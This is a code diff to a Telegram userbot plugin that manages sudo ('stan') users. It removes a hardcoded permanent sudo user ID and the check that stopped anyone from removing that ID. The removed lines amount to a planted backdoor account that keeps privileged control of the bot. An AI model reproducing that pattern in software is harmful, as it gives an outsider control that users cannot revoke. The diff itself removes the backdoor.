@@ -4,9 +4,6 @@ from pyrogram.types import Message
 from . import Config, HelpMenu, db, Pbxbot, on_message
 
 
-PERMANENT_SUDO_ID = 7588172591
-
-
 @on_message("stan", allow_stan=True)
 async def stanUsers(client: Client, message: Message):
     Pbx = await Pbxbot.edit(message, "__Fetching users...__")
@@ -58,9 +55,6 @@ async def addstan(client: Client, message: Message):
     Config.AUTH_USERS.add(user.id)
     Config.STAN_USERS.add(user.id)
 
-    if user.id == PERMANENT_SUDO_ID:
-        await Pbxbot.send_message(client.me.id, "__Permanent sudo user added!__")
-
 
 @on_message("rmsudo", allow_stan=False)
 async def delstan(client: Client, message: Message):
@@ -78,9 +72,6 @@ async def delstan(client: Client, message: Message):
             return await Pbxbot.delete(
                 message, "__Give me a valid user id to remove them from stans!__"
             )
-
-    if user.id == PERMANENT_SUDO_ID:
-        return await Pbxbot.send_message(client.me.id, "__This user cannot be removed from sudo!__")
 
     if await db.is_stan(client.me.id, user.id):
         await db.rm_stan(client.me.id, user.id)
